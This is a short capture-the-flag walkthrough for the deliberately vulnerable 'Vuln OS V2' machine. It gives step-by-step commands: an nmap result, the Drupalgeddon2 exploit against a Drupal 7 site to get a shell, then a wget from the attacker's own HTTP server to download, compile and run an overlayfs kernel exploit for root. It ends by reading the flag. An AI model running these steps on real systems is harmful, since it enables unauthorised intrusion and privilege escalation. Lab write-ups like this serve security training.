--------------------------------
# Author Shubham Ranpise
--------------------------------

# 15/december/2022

# Vuln OS V2

----------------------------------------------------------------
# nmap scan (website hosted on port 80)
----------------------------------------------------------------
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.6 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.7 ((Ubuntu))
6667/tcp open  irc     ngircd

----------------------------------------------------------------
# Its drupal website version 7.x (vulnerable to drupalgeddon)
----------------------------------------------------------------
(Note)
THERE IS SOME PROBLEM WITH THIS EXPLOIT 
YOU CAN'T CHANGE DIRECTORY
AND CANT DO privilege escalation
SO TRY TO USE METASPOIT MODULE FOR EXPLOITATION IF POSSIBLE :)
METASPLOIT MODULE
unix/webapp/drupal_drupalgeddon2)

-> sudo gem install highline
-> git clone https://github.com/dreadlocked/Drupalgeddon2.git
-> pip install droopescan
-> ./drupalgeddon2.rb http://10.0.2.11/jabc/
you got shell

----------------------------------------------------------------
# privilege escalation
  (kernel version is vulnerable overlayfs exploit)
----------------------------------------------------------------
-> uname -r 
3.13.0-24-generic

download https://www.exploit-db.com/exploits/37292
-> python3 -m http.server 8000  

-> cd /tmp
-> wget http://10.0.2.9:8000/37292.c -O exploit.c
-> gcc exploit.c -o exploit
-> ./exploit

You got root

----------------------------------------------------------------
# flag
----------------------------------------------------------------
-> cat /root/flag.txt
Hello and welcome.
You successfully compromised the company "JABC" and the server completely !!
Congratulations !!!
Hope you enjoyed it.

What do you think of A.I.?